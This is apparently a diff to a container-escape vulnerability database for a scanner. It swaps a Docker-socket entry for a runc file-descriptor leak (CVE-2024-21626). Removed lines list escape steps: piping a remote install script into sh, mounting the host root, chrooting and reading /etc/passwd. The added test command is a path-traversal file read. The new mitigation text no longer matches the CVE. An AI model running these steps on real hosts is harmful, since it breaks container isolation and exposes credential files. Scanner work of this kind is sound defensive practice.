@@ -64,34 +64,26 @@
       ]
     },
     {
-      "name": "CVE-2019-5736",
+      "name": "CVE-2024-21626",
       "type": "Docker escape",
-      "description": "Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信。Docker守护进程是Docker引擎的核心组件，负责管理和执行容器。Docker Socket允许用户通过基于RESTful API的请求与Docker守护进程进行通信，以便执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。",
+      "description": "从公告讲就是 runc run 或者 runc exec 的过程中有存在没有及时关闭的 fd ，导致文件描述符泄漏在容器环境中，用户可以通过这个文件描述来进行容器逃逸。",
       "versions_affected": [
-        "docker version <=18.09.2 RunC version <=1.0-rc6"
+        "1.0.0-rc93<= RunC version <=1.1.11"
       ],
       "severity": "Critical",
-      "cvss_score": 0,
-      "test_command": "ls -lah /var/run/docker.sock",
-      "expected_output": "-.*/var/run/docker.sock.*",
+      "cvss_score": 8.6,
+      "test_command": "cat ../../../../../../tmp/Container_runtime_scanner",
+      "expected_output": "Container_runtime_scanner_123456",
       "steps_to_exploit": [
-        "apt-get update",
-        "apt-get install curl -y",
-        "curl -fsSL https://get.docker.com/ | sh",
-        "docker run -it -v /:/test2 ubuntu /bin/bash",
-        "chroot /test2 /bin/sh -c 'cat /etc/passwd'"
       ],
       "steps_to_verify": [
-        "chroot /test2 /bin/sh -c 'ls /.dockerenv'"
       ],
-      "verify_output":"No such file or directory",
+      "verify_output":"",
       "last_step": [
-        "umount -f /test2",
-        "rm -r /test2"
       ],
       "mitigation": "禁止docker.socket挂载",
       "references": [
-        "https://example.com/cve-2024-xxxx",
+        "https://nvd.nist.gov/vuln/detail/cve-2024-21626",
         "https://exploit-db.com/exploits/xxxx"
       ]
     }
